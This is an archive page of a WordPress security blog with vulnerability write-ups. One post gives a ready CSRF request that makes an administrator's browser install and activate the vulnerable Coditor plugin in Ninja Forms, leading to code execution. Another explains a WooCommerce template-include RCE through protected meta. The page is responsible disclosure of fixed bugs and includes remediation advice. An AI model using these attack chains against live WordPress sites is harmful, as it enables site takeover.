<!DOCTYPE html>
<html class="no-js" lang="en-US"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>plugins â€“ WP deeply</title><link rel="dns-prefetch" href="//s.w.org"><link rel="stylesheet" id="wp-block-library-css" href="https://wpdeeply.com/wp-includes/css/dist/block-library/style.min.css" media="all"><link rel="stylesheet" id="coblocks-frontend-css" href="https://wpdeeply.com/wp-content/plugins/coblocks/dist/coblocks-style.css" media="all"><link rel="stylesheet" id="mkaz-code-syntax-css-css" href="https://wpdeeply.com/wp-content/plugins/code-syntax-block/assets/blocks.style.css" media="all"><link rel="stylesheet" id="mkaz-code-syntax-prism-css-css" href="https://wpdeeply.com/wp-content/plugins/code-syntax-block/assets/prism/prism.css" media="all"><link rel="stylesheet" id="twentytwenty-style-css" href="https://wpdeeply.com/wp-content/themes/twentytwenty/style.css" media="all"><style id="twentytwenty-style-inline-css">
.color-accent,.color-accent-hover:hover,.color-accent-hover:focus,:root .has-accent-color,.has-drop-cap:not(:focus):first-letter,.wp-block-button.is-style-outline,a { color: #e22658; }blockquote,.border-color-accent,.border-color-accent-hover:hover,.border-color-accent-hover:focus { border-color: #e22658; }button:not(.toggle),.button,.faux-button,.wp-block-button__link,.wp-block-file .wp-block-file__button,input[type="button"],input[type="reset"],input[type="submit"],.bg-accent,.bg-accent-hover:hover,.bg-accent-hover:focus,:root .has-accent-background-color,.comment-reply-link { background-color: #e22658; }.fill-children-accent,.fill-children-accent * { fill: #e22658; }:root .has-background-color,button,.button,.faux-button,.wp-block-button__link,.wp-block-file__button,input[type="button"],input[type="reset"],input[type="submit"],.wp-block-button,.comment-reply-link,.has-background.has-primary-background-color:not(.has-text-color),.has-background.has-primary-background-color *:not(.has-text-color),.has-background.has-accent-background-color:not(.has-text-color),.has-background.has-accent-background-color *:not(.has-text-color) { color: #ffffff; }:root .has-background-background-color { background-color: #ffffff; }body,.entry-title a,:root .has-primary-color { color: #000000; }:root .has-primary-background-color { background-color: #000000; }cite,figcaption,.wp-caption-text,.post-meta,.entry-content .wp-block-archives li,.entry-content .wp-block-categories li,.entry-content .wp-block-latest-posts li,.wp-block-latest-comments__comment-date,.wp-block-latest-posts__post-date,.wp-block-embed figcaption,.wp-block-image figcaption,.wp-block-pullquote cite,.comment-metadata,.comment-respond .comment-notes,.comment-respond .logged-in-as,.pagination .dots,.entry-content hr:not(.has-background),hr.styled-separator,:root .has-secondary-color { color: #6d6d6d; }:root .has-secondary-background-color { background-color: #6d6d6d; }pre,fieldset,input,textarea,table,table *,hr { border-color: #dbdbdb; }caption,code,code,kbd,samp,.wp-block-table.is-style-stripes tbody tr:nth-child(odd),:root .has-subtle-background-background-color { background-color: #dbdbdb; }.wp-block-table.is-style-stripes { border-bottom-color: #dbdbdb; }.wp-block-latest-posts.is-grid li { border-top-color: #dbdbdb; }:root .has-subtle-background-color { color: #dbdbdb; }body:not(.overlay-header) .primary-menu > li > a,body:not(.overlay-header) .primary-menu > li > .icon,.modal-menu a,.footer-menu a, .footer-widgets a,#site-footer .wp-block-button.is-style-outline,.wp-block-pullquote:before,.singular:not(.overlay-header) .entry-header a,.archive-header a,.header-footer-group .color-accent,.header-footer-group .color-accent-hover:hover { color: #cd2653; }.social-icons a,#site-footer button:not(.toggle),#site-footer .button,#site-footer .faux-button,#site-footer .wp-block-button__link,#site-footer .wp-block-file__button,#site-footer input[type="button"],#site-footer input[type="reset"],#site-footer input[type="submit"] { background-color: #cd2653; }.header-footer-group,body:not(.overlay-header) #site-header .toggle,.menu-modal .toggle { color: #000000; }body:not(.overlay-header) .primary-menu ul { background-color: #000000; }body:not(.overlay-header) .primary-menu > li > ul:after { border-bottom-color: #000000; }body:not(.overlay-header) .primary-menu ul ul:after { border-left-color: #000000; }.site-description,body:not(.overlay-header) .toggle-inner .toggle-text,.widget .post-date,.widget .rss-date,.widget_archive li,.widget_categories li,.widget cite,.widget_pages li,.widget_meta li,.widget_nav_menu li,.powered-by-wordpress,.to-the-top,.singular .entry-header .post-meta,.singular:not(.overlay-header) .entry-header .post-meta a { color: #6d6d6d; }.header-footer-group pre,.header-footer-group fieldset,.header-footer-group input,.header-footer-group textarea,.header-footer-group table,.header-footer-group table *,.footer-nav-widgets-wrapper,#site-footer,.menu-modal nav *,.footer-widgets-outer-wrapper,.footer-top { border-color: #dcd7ca; }.header-footer-group table caption,body:not(.overlay-header) .header-inner .toggle-wrapper::before { background-color: #dcd7ca; }
</style><link rel="stylesheet" id="twentytwenty-print-style-css" href="https://wpdeeply.com/wp-content/themes/twentytwenty/print.css" media="print"><script src="https://wpdeeply.com/wp-content/themes/twentytwenty/assets/js/index.js" async></script><script>document.documentElement.className = document.documentElement.className.replace( 'no-js', 'js' );</script><style id="custom-background-css">
body.custom-background { background-color: #ffffff; }
</style></head><body class="archive category category-plugins category-7 custom-background wp-embed-responsive is-twentytwenty has-no-pagination showing-comments show-avatars footer-top-hidden reduced-spacing">

		<a class="skip-link screen-reader-text" href="#site-content">Skip to the content</a>
		<header id="site-header" class="header-footer-group" role="banner"><div class="header-inner section-inner">

				<div class="header-titles-wrapper">

					
					<div class="header-titles">

						<div class="site-title faux-heading"><a href="https://wpdeeply.com/">WP deeply</a></div>
					</div>

					<button class="toggle nav-toggle mobile-nav-toggle" data-toggle-target=".menu-modal" data-toggle-body-class="showing-menu-modal" aria-expanded="false" data-set-focus=".close-nav-toggle">
						<span class="toggle-inner">
							<span class="toggle-icon">
								<svg class="svg-icon" aria-hidden="true" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" width="26" height="7" viewbox="0 0 26 7"><path fill-rule="evenodd" d="M332.5,45 C330.567003,45 329,43.4329966 329,41.5 C329,39.5670034 330.567003,38 332.5,38 C334.432997,38 336,39.5670034 336,41.5 C336,43.4329966 334.432997,45 332.5,45 Z M342,45 C340.067003,45 338.5,43.4329966 338.5,41.5 C338.5,39.5670034 340.067003,38 342,38 C343.932997,38 345.5,39.5670034 345.5,41.5 C345.5,43.4329966 343.932997,45 342,45 Z M351.5,45 C349.567003,45 348,43.4329966 348,41.5 C348,39.5670034 349.567003,38 351.5,38 C353.432997,38 355,39.5670034 355,41.5 C355,43.4329966 353.432997,45 351.5,45 Z" transform="translate(-329 -38)"></path></svg></span>
							<span class="toggle-text">Menu</span>
						</span>
					</button>

				</div>

				<div class="header-navigation-wrapper">

					
							<nav class="primary-menu-wrapper" aria-label="Horizontal" role="navigation"><ul class="primary-menu reset-list-style"><li id="menu-item-29" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-29"><a href="https://wpdeeply.com/">home</a></li>
<li id="menu-item-122" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-122"><a href="https://wpdeeply.com/core/">core</a></li>
<li id="menu-item-154" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-154"><a href="https://wpdeeply.com/plugins/">plugins</a></li>
<li id="menu-item-207" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-207"><a href="https://wpdeeply.com/red-team/">red team</a></li>
<li id="menu-item-165" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-165"><a href="https://wpdeeply.com/contact/">contact</a></li>

								</ul></nav><div class="header-toggles hide-no-js">

						
							<div class="toggle-wrapper nav-toggle-wrapper has-expanded-menu">

								<button class="toggle nav-toggle desktop-nav-toggle" data-toggle-target=".menu-modal" data-toggle-body-class="showing-menu-modal" aria-expanded="false" data-set-focus=".close-nav-toggle">
									<span class="toggle-inner">
										<span class="toggle-text">Menu</span>
										<span class="toggle-icon">
											<svg class="svg-icon" aria-hidden="true" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" width="26" height="7" viewbox="0 0 26 7"><path fill-rule="evenodd" d="M332.5,45 C330.567003,45 329,43.4329966 329,41.5 C329,39.5670034 330.567003,38 332.5,38 C334.432997,38 336,39.5670034 336,41.5 C336,43.4329966 334.432997,45 332.5,45 Z M342,45 C340.067003,45 338.5,43.4329966 338.5,41.5 C338.5,39.5670034 340.067003,38 342,38 C343.932997,38 345.5,39.5670034 345.5,41.5 C345.5,43.4329966 343.932997,45 342,45 Z M351.5,45 C349.567003,45 348,43.4329966 348,41.5 C348,39.5670034 349.567003,38 351.5,38 C353.432997,38 355,39.5670034 355,41.5 C355,43.4329966 353.432997,45 351.5,45 Z" transform="translate(-329 -38)"></path></svg></span>
									</span>
								</button>

							</div>

							
						</div>
						
				</div>

			</div>

			
		</header><div class="menu-modal cover-modal header-footer-group" data-modal-target-string=".menu-modal">

	<div class="menu-modal-inner modal-inner">

		<div class="menu-wrapper section-inner">

			<div class="menu-top">

				<button class="toggle close-nav-toggle fill-children-current-color" data-toggle-target=".menu-modal" data-toggle-body-class="showing-menu-modal" aria-expanded="false" data-set-focus=".menu-modal">
					<span class="toggle-text">Close Menu</span>
					<svg class="svg-icon" aria-hidden="true" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewbox="0 0 16 16"><polygon fill="" fill-rule="evenodd" points="6.852 7.649 .399 1.195 1.445 .149 7.899 6.602 14.352 .149 15.399 1.195 8.945 7.649 15.399 14.102 14.352 15.149 7.899 8.695 1.445 15.149 .399 14.102"></polygon></svg></button>

				
					<nav class="expanded-menu" aria-label="Expanded" role="navigation"><ul class="modal-menu reset-list-style"><li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-29"><div class="ancestor-wrapper"><a href="https://wpdeeply.com/">home</a></div></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-122"><div class="ancestor-wrapper"><a href="https://wpdeeply.com/core/">core</a></div></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-154"><div class="ancestor-wrapper"><a href="https://wpdeeply.com/plugins/">plugins</a></div></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-207"><div class="ancestor-wrapper"><a href="https://wpdeeply.com/red-team/">red team</a></div></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-165"><div class="ancestor-wrapper"><a href="https://wpdeeply.com/contact/">contact</a></div></li>
						</ul></nav><nav class="mobile-menu" aria-label="Mobile" role="navigation"><ul class="modal-menu reset-list-style"><li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-29"><div class="ancestor-wrapper"><a href="https://wpdeeply.com/">home</a></div></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-122"><div class="ancestor-wrapper"><a href="https://wpdeeply.com/core/">core</a></div></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-154"><div class="ancestor-wrapper"><a href="https://wpdeeply.com/plugins/">plugins</a></div></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-207"><div class="ancestor-wrapper"><a href="https://wpdeeply.com/red-team/">red team</a></div></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-165"><div class="ancestor-wrapper"><a href="https://wpdeeply.com/contact/">contact</a></div></li>

						</ul></nav></div>

			<div class="menu-bottom">

				
			</div>

		</div>

	</div>

</div>

<main id="site-content" role="main"><header class="archive-header has-text-align-center header-footer-group"><div class="archive-header-inner section-inner medium">

									<h1 class="archive-title"><span class="color-accent">Category:</span> plugins</h1>
				
									<div class="archive-subtitle section-inner thin max-percentage intro-text"><p>plugins security</p>
</div>
				
			</div>

		</header><article class="post-223 post type-post status-publish format-standard hentry category-plugins tag-fixed" id="post-223"><header class="entry-header has-text-align-center"><div class="entry-header-inner section-inner medium">

		
			<div class="entry-categories">
				<span class="screen-reader-text">Categories</span>
				<div class="entry-categories-inner">
					<a href="https://wpdeeply.com/category/plugins/" rel="category tag">plugins</a>				</div>
			</div>

			<h2 class="entry-title heading-size-1"><a href="https://wpdeeply.com/ninja-forms-before-3-4-27-1-simple-csrf-to-rce/">Ninja Forms before 3.4.27.1 simple CSRF to RCE</a></h2>
		<div class="post-meta-wrapper post-meta-single post-meta-single-top">

			<ul class="post-meta"><li class="post-author meta-wrapper">
						<span class="meta-icon">
							<span class="screen-reader-text">Post author</span>
							<svg class="svg-icon" aria-hidden="true" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" width="18" height="20" viewbox="0 0 18 20"><path fill="" d="M18,19 C18,19.5522847 17.5522847,20 17,20 C16.4477153,20 16,19.5522847 16,19 L16,17 C16,15.3431458 14.6568542,14 13,14 L5,14 C3.34314575,14 2,15.3431458 2,17 L2,19 C2,19.5522847 1.55228475,20 1,20 C0.44771525,20 0,19.5522847 0,19 L0,17 C0,14.2385763 2.23857625,12 5,12 L13,12 C15.7614237,12 18,14.2385763 18,17 L18,19 Z M9,10 C6.23857625,10 4,7.76142375 4,5 C4,2.23857625 6.23857625,0 9,0 C11.7614237,0 14,2.23857625 14,5 C14,7.76142375 11.7614237,10 9,10 Z M9,8 C10.6568542,8 12,6.65685425 12,5 C12,3.34314575 10.6568542,2 9,2 C7.34314575,2 6,3.34314575 6,5 C6,6.65685425 7.34314575,8 9,8 Z"></path></svg></span>
						<span class="meta-text">
							By <a href="https://wpdeeply.com/author/root/">root</a>						</span>
					</li>
										<li class="post-date meta-wrapper">
						<span class="meta-icon">
							<span class="screen-reader-text">Post date</span>
							<svg class="svg-icon" aria-hidden="true" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" width="18" height="19" viewbox="0 0 18 19"><path fill="" d="M4.60069444,4.09375 L3.25,4.09375 C2.47334957,4.09375 1.84375,4.72334957 1.84375,5.5 L1.84375,7.26736111 L16.15625,7.26736111 L16.15625,5.5 C16.15625,4.72334957 15.5266504,4.09375 14.75,4.09375 L13.3993056,4.09375 L13.3993056,4.55555556 C13.3993056,5.02154581 13.0215458,5.39930556 12.5555556,5.39930556 C12.0895653,5.39930556 11.7118056,5.02154581 11.7118056,4.55555556 L11.7118056,4.09375 L6.28819444,4.09375 L6.28819444,4.55555556 C6.28819444,5.02154581 5.9104347,5.39930556 5.44444444,5.39930556 C4.97845419,5.39930556 4.60069444,5.02154581 4.60069444,4.55555556 L4.60069444,4.09375 Z M6.28819444,2.40625 L11.7118056,2.40625 L11.7118056,1 C11.7118056,0.534009742 12.0895653,0.15625 12.5555556,0.15625 C13.0215458,0.15625 13.3993056,0.534009742 13.3993056,1 L13.3993056,2.40625 L14.75,2.40625 C16.4586309,2.40625 17.84375,3.79136906 17.84375,5.5 L17.84375,15.875 C17.84375,17.5836309 16.4586309,18.96875 14.75,18.96875 L3.25,18.96875 C1.54136906,18.96875 0.15625,17.5836309 0.15625,15.875 L0.15625,5.5 C0.15625,3.79136906 1.54136906,2.40625 3.25,2.40625 L4.60069444,2.40625 L4.60069444,1 C4.60069444,0.534009742 4.97845419,0.15625 5.44444444,0.15625 C5.9104347,0.15625 6.28819444,0.534009742 6.28819444,1 L6.28819444,2.40625 Z M1.84375,8.95486111 L1.84375,15.875 C1.84375,16.6516504 2.47334957,17.28125 3.25,17.28125 L14.75,17.28125 C15.5266504,17.28125 16.15625,16.6516504 16.15625,15.875 L16.15625,8.95486111 L1.84375,8.95486111 Z"></path></svg></span>
						<span class="meta-text">
							<a href="https://wpdeeply.com/ninja-forms-before-3-4-27-1-simple-csrf-to-rce/">September 22, 2020</a>
						</span>
					</li>
					
			</ul></div>

		
	</div>

</header><div class="post-inner thin ">

		<div class="entry-content">

			
<p>The <a href="https://plugins.trac.wordpress.org/browser/ninja-forms/tags/3.4.27/services/bootstrap.php#L49" target="_blank" rel="noreferrer noopener">bug</a> is more than simple, GET request with Administrator cookies in it, will result with any plugin from WP dot org installation & activation. If we talk about regular web application, then this wonâ€™t be even a issue and server miss configuration could be blamed (writable executable files), but we talk about WordPress where those conditions are advertised as good and are needed in the name of the security :/</p>



<p>Today the CSRF issues arenâ€™t the thing that much, because browsers protection, developers experience and web admins experience. Anyway, simple GET request cross domain or on same domain that will result with RCE is more than dangerous scenario, easy to be performed and hard to be noticed even by most experienced web masters.</p>



<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/ninja-forms-csrf-rce.md#eli5-poc"></a>Eli5 PoC</h2>



<p>InÂ <code>services/bootstrap.php</code>Â there is ajax action calledÂ <code>nf_services_install</code>. If we look at its code we will notice that there isnâ€™t CSRF protection in the form of nonce check / validation, but there is only logged in user permissions check (that is why CSRF attack will work against high privileged accounts)</p>



<pre class="wp-block-code"><code lang="php" class="language-php">if ( ! current_user_can('install_plugins') )
	die( json_encode( [ 'error' => esc_html__( 'Sorry, you are not allowed to install plugins on this site.' ) ] ) );
	
$plugin = \WPN_Helper::sanitize_text_field($_REQUEST['plugin']);
$install_path = \WPN_Helper::sanitize_text_field($_REQUEST['install_path']);</code></pre>



<p>the rest of the code is plugin download based onÂ <code>$_REQUEST['plugin']</code>Â and plugin activation, based onÂ <code>$_REQUEST['install_path']</code>. So the final link that need to be opened withÂ <code>Administrator</code>Â cookies in it will be something like this:</p>



<pre class="wp-block-code"><code class="">hxxts://local.target/wp-admin/admin-ajax.php?action=nf_services_install&plugin=coditor&install_path=coditor/coditor.php 
</code></pre>



<p>Could be shortened link, could be img tag in email or wp instance content, â€¦ There is huge room for successful attack ğŸ™‚</p>



<h3><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/ninja-forms-csrf-rce.md#what-is-coditor-"></a>What is coditor ?</h3>



<p><a href="https://wordpress.org/plugins/coditor/" target="_blank" rel="noreferrer noopener">Coditor</a> is WP plugin not updated several years, but still active ( was and after my report isnâ€™t any more ) and was vulnerable towards RCE from lowest possible user role on any WP instance e.g. any logged in user. That was possible <a href="https://plugins.trac.wordpress.org/browser/coditor/trunk/coditor.php" target="_blank" rel="noreferrer noopener">because</a>:</p>



<pre class="wp-block-code"><code lang="php" class="language-php">add_action('wp_ajax_coditor_process_ajax', array($this, 'coditor_process_ajax'));</code></pre>



<p>andÂ <code>coditor_process_ajax</code>Â method allows editing and deletion of any file underÂ <code>$coditor = new Coditor(WP_CONTENT_DIR);</code>Â => any plugin / theme.</p>



<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/ninja-forms-csrf-rce.md#few-facts"></a>Few facts</h2>



<ul><li>In 30 minutes I found several forgotten plugins in the repository with RCE in them (pre auth or subscriber user role)</li><li>Attackers could deploy their own plugin towards wp dot org repository and to add backdoor in next iterations</li><li>If you search and you find for complete attack scenario with vulnerable plugin from the repository, then try to report that plugin towards authors.</li></ul><h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/ninja-forms-csrf-rce.md#remediation"></a>Remediation</h2>



<ul><li>Do not allow your plugins / themes directory to be writable byÂ <code>www-data</code>Â user beside the fact it is advertised like that by WP folks</li><li>Update to the latest version of Ninja Forms plugin :/</li></ul></div>

	</div>

	<div class="section-inner">
		
		<div class="post-meta-wrapper post-meta-single post-meta-single-bottom">

			<ul class="post-meta"><li class="post-tags meta-wrapper">
						<span class="meta-icon">
							<span class="screen-reader-text">Tags</span>
							<svg class="svg-icon" aria-hidden="true" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewbox="0 0 18 18"><path fill="" d="M15.4496399,8.42490555 L8.66109799,1.63636364 L1.63636364,1.63636364 L1.63636364,8.66081885 L8.42522727,15.44178 C8.57869221,15.5954158 8.78693789,15.6817418 9.00409091,15.6817418 C9.22124393,15.6817418 9.42948961,15.5954158 9.58327627,15.4414581 L15.4486339,9.57610048 C15.7651495,9.25692435 15.7649133,8.74206554 15.4496399,8.42490555 Z M16.6084423,10.7304545 L10.7406818,16.59822 C10.280287,17.0591273 9.65554997,17.3181054 9.00409091,17.3181054 C8.35263185,17.3181054 7.72789481,17.0591273 7.26815877,16.5988788 L0.239976954,9.57887876 C0.0863319284,9.4254126 0,9.21716044 0,9 L0,0.818181818 C0,0.366312477 0.366312477,0 0.818181818,0 L9,0 C9.21699531,0 9.42510306,0.0862010512 9.57854191,0.239639906 L16.6084423,7.26954545 C17.5601275,8.22691012 17.5601275,9.77308988 16.6084423,10.7304545 Z M5,6 C4.44771525,6 4,5.55228475 4,5 C4,4.44771525 4.44771525,4 5,4 C5.55228475,4 6,4.44771525 6,5 C6,5.55228475 5.55228475,6 5,6 Z"></path></svg></span>
						<span class="meta-text">
							<a href="https://wpdeeply.com/tag/fixed/" rel="tag">fixed</a>						</span>
					</li>
					
			</ul></div>

		
	</div>

	
</article><hr class="post-separator styled-separator is-style-wide section-inner" aria-hidden="true"><article class="post-217 post type-post status-publish format-standard hentry category-plugins tag-fixed" id="post-217"><header class="entry-header has-text-align-center"><div class="entry-header-inner section-inner medium">

		
			<div class="entry-categories">
				<span class="screen-reader-text">Categories</span>
				<div class="entry-categories-inner">
					<a href="https://wpdeeply.com/category/plugins/" rel="category tag">plugins</a>				</div>
			</div>

			<h2 class="entry-title heading-size-1"><a href="https://wpdeeply.com/woocommerce-4-1-0-remote-code-execution/">WooCommerce before 4.1.0 Remote Code Execution</a></h2>
		<div class="post-meta-wrapper post-meta-single post-meta-single-top">

			<ul class="post-meta"><li class="post-author meta-wrapper">
						<span class="meta-icon">
							<span class="screen-reader-text">Post author</span>
							<svg class="svg-icon" aria-hidden="true" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" width="18" height="20" viewbox="0 0 18 20"><path fill="" d="M18,19 C18,19.5522847 17.5522847,20 17,20 C16.4477153,20 16,19.5522847 16,19 L16,17 C16,15.3431458 14.6568542,14 13,14 L5,14 C3.34314575,14 2,15.3431458 2,17 L2,19 C2,19.5522847 1.55228475,20 1,20 C0.44771525,20 0,19.5522847 0,19 L0,17 C0,14.2385763 2.23857625,12 5,12 L13,12 C15.7614237,12 18,14.2385763 18,17 L18,19 Z M9,10 C6.23857625,10 4,7.76142375 4,5 C4,2.23857625 6.23857625,0 9,0 C11.7614237,0 14,2.23857625 14,5 C14,7.76142375 11.7614237,10 9,10 Z M9,8 C10.6568542,8 12,6.65685425 12,5 C12,3.34314575 10.6568542,2 9,2 C7.34314575,2 6,3.34314575 6,5 C6,6.65685425 7.34314575,8 9,8 Z"></path></svg></span>
						<span class="meta-text">
							By <a href="https://wpdeeply.com/author/root/">root</a>						</span>
					</li>
										<li class="post-date meta-wrapper">
						<span class="meta-icon">
							<span class="screen-reader-text">Post date</span>
							<svg class="svg-icon" aria-hidden="true" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" width="18" height="19" viewbox="0 0 18 19"><path fill="" d="M4.60069444,4.09375 L3.25,4.09375 C2.47334957,4.09375 1.84375,4.72334957 1.84375,5.5 L1.84375,7.26736111 L16.15625,7.26736111 L16.15625,5.5 C16.15625,4.72334957 15.5266504,4.09375 14.75,4.09375 L13.3993056,4.09375 L13.3993056,4.55555556 C13.3993056,5.02154581 13.0215458,5.39930556 12.5555556,5.39930556 C12.0895653,5.39930556 11.7118056,5.02154581 11.7118056,4.55555556 L11.7118056,4.09375 L6.28819444,4.09375 L6.28819444,4.55555556 C6.28819444,5.02154581 5.9104347,5.39930556 5.44444444,5.39930556 C4.97845419,5.39930556 4.60069444,5.02154581 4.60069444,4.55555556 L4.60069444,4.09375 Z M6.28819444,2.40625 L11.7118056,2.40625 L11.7118056,1 C11.7118056,0.534009742 12.0895653,0.15625 12.5555556,0.15625 C13.0215458,0.15625 13.3993056,0.534009742 13.3993056,1 L13.3993056,2.40625 L14.75,2.40625 C16.4586309,2.40625 17.84375,3.79136906 17.84375,5.5 L17.84375,15.875 C17.84375,17.5836309 16.4586309,18.96875 14.75,18.96875 L3.25,18.96875 C1.54136906,18.96875 0.15625,17.5836309 0.15625,15.875 L0.15625,5.5 C0.15625,3.79136906 1.54136906,2.40625 3.25,2.40625 L4.60069444,2.40625 L4.60069444,1 C4.60069444,0.534009742 4.97845419,0.15625 5.44444444,0.15625 C5.9104347,0.15625 6.28819444,0.534009742 6.28819444,1 L6.28819444,2.40625 Z M1.84375,8.95486111 L1.84375,15.875 C1.84375,16.6516504 2.47334957,17.28125 3.25,17.28125 L14.75,17.28125 C15.5266504,17.28125 16.15625,16.6516504 16.15625,15.875 L16.15625,8.95486111 L1.84375,8.95486111 Z"></path></svg></span>
						<span class="meta-text">
							<a href="https://wpdeeply.com/woocommerce-4-1-0-remote-code-execution/">August 25, 2020</a>
						</span>
					</li>
					
			</ul></div>

		
	</div>

</header><div class="post-inner thin ">

		<div class="entry-content">

			
<p>WooCommerce plugin is raw model how good WordPress plugin should look like and very often we can see how many another plugins around eco system very often borrow knowledge/source from it and that is probably ok. What is important to be mentioned here is the fact that there isnâ€™t any log that will show us all of those usages, but changelogs should be enough for developers to get the idea being Security fixes or not? From the 4.1.0 changelog we have the following:</p>



<pre class="wp-block-code"><code class="">* Security - Fixed unescaped meta data while duplicating products. Reported by Slavco.
</code></pre>



<p>but is this enough, is everything told and do you get the idea about the vulnerability?!</p>



<figure class="wp-block-video"><video controls src="https://wpdeeply.com/wp-content/uploads/2020/07/woosploit.mp4"></video></figure><p> I know, no or maybe is the answer.</p>



<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/woosploit.md#what-is-fixed-in-410"></a>What is fixed in 4.1.0</h2>



<p>According the logs there is issue with unescaped meta keys while duplicating products and fix is more than obvious e.g. there isÂ <code>wp_slash</code>added to theÂ <code>$meta->key</code>Â inÂ <code>class-wc-data-store-wp.php</code>.</p>



<pre class="wp-block-code"><code lang="php" class="language-php">return add_metadata( $this->meta_type, $object->get_id(), wp_slash( $meta->key ), is_string( $meta->value ) ? wp_slash( $meta->value ) : $meta->value, false );

</code></pre>



<p>So where is the RCE? If we see the code diff experienced eye should get the attention of changes inÂ <code>class-wc-template-loader.php</code>Â file, methodÂ <code>get_template_loader_files</code>Â e.g.</p>



<pre class="wp-block-code"><code lang="php" class="language-php">if ( is_page_template() ) {
			$page_template = get_page_template_slug();

			if ( $page_template ) {
				$validated_file = validate_file( $page_template );
				if ( 0 === $validated_file ) {
					$templates[] = $page_template;
				} else {
					error_log( "WooCommerce: Unable to validate template path: \"$page_template\". Error Code: $validated_file." );
				}
			}
		}
</code></pre>



<p>and this means that there is added validation to the value returned byÂ <code>get_page_template_slug</code>Â which in fact isÂ <code>_wp_page_template</code> protected meta value. This means thatÂ <code>_wp_page_template</code>Â could hold any value towards any location and that value to beÂ <code>included</code>Â while rendering templates at WP.</p>



<pre class="wp-block-code"><code lang="php" class="language-php">$template = apply_filters( 'template_include', $template );
	if ( $template ) {
		include $template;
	} elseif
</code></pre>



<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/woosploit.md#who-is-affected"></a>Who is affected</h2>



<p>Attack surface is bigger than advertised.</p>



<ul><li>Duplicating products</li><li>Protected meta could be written while importing products trough new Woo importer, remember it isÂ <code>class-wc-data-store-wp.php</code></li><li>BecauseÂ <code>class-wc-template-loader.php</code>Â anyÂ <code>import</code>Â user role is RCE able on Woo setups, but there is <a href="https://wpdeeply.com/wordpress-importer-arbitrary-post-create/" target="_blank" rel="noreferrer noopener">contributor/visitor</a> attack in game</li><li>Unserialize trough <a href="https://wpdeeply.com/wordpress-attachment-api-functions-and-any-post-type/" target="_blank" rel="noreferrer noopener">PHAR</a> maybe?</li><li>All of those Woo marketplaces, multi language stores, managed setupsâ€¦  </li></ul><h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/woosploit.md#remediation"></a>Remediation</h2>



<p>Take measures about content in any uploaded files on your WP setup, but also for the content of the files that could be created while modifing them.</p>

		</div>

	</div>

	<div class="section-inner">
		
		<div class="post-meta-wrapper post-meta-single post-meta-single-bottom">

			<ul class="post-meta"><li class="post-tags meta-wrapper">
						<span class="meta-icon">
							<span class="screen-reader-text">Tags</span>
							<svg class="svg-icon" aria-hidden="true" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewbox="0 0 18 18"><path fill="" d="M15.4496399,8.42490555 L8.66109799,1.63636364 L1.63636364,1.63636364 L1.63636364,8.66081885 L8.42522727,15.44178 C8.57869221,15.5954158 8.78693789,15.6817418 9.00409091,15.6817418 C9.22124393,15.6817418 9.42948961,15.5954158 9.58327627,15.4414581 L15.4486339,9.57610048 C15.7651495,9.25692435 15.7649133,8.74206554 15.4496399,8.42490555 Z M16.6084423,10.7304545 L10.7406818,16.59822 C10.280287,17.0591273 9.65554997,17.3181054 9.00409091,17.3181054 C8.35263185,17.3181054 7.72789481,17.0591273 7.26815877,16.5988788 L0.239976954,9.57887876 C0.0863319284,9.4254126 0,9.21716044 0,9 L0,0.818181818 C0,0.366312477 0.366312477,0 0.818181818,0 L9,0 C9.21699531,0 9.42510306,0.0862010512 9.57854191,0.239639906 L16.6084423,7.26954545 C17.5601275,8.22691012 17.5601275,9.77308988 16.6084423,10.7304545 Z M5,6 C4.44771525,6 4,5.55228475 4,5 C4,4.44771525 4.44771525,4 5,4 C5.55228475,4 6,4.44771525 6,5 C6,5.55228475 5.55228475,6 5,6 Z"></path></svg></span>
						<span class="meta-text">
							<a href="https://wpdeeply.com/tag/fixed/" rel="tag">fixed</a>						</span>
					</li>
					
			</ul></div>

		
	</div>

	
</article><hr class="post-separator styled-separator is-style-wide section-inner" aria-hidden="true"><article class="post-199 post type-post status-publish format-standard hentry category-core category-plugins tag-0day" id="post-199"><header class="entry-header has-text-align-center"><div class="entry-header-inner section-inner medium">

		
			<div class="entry-categories">
				<span class="screen-reader-text">Categories</span>
				<div class="entry-categories-inner">
					<a href="https://wpdeeply.com/category/core/" rel="category tag">core</a> <a href="https://wpdeeply.com/category/plugins/" rel="category tag">plugins</a>				</div>
			</div>

			<h2 class="entry-title heading-size-1"><a href="https://wpdeeply.com/wordpress-protected-meta-via-wp-job-manager/">WordPress protected meta via wp job manager</a></h2>
		<div class="post-meta-wrapper post-meta-single post-meta-single-top">

			<ul class="post-meta"><li class="post-author meta-wrapper">
						<span class="meta-icon">
							<span class="screen-reader-text">Post author</span>
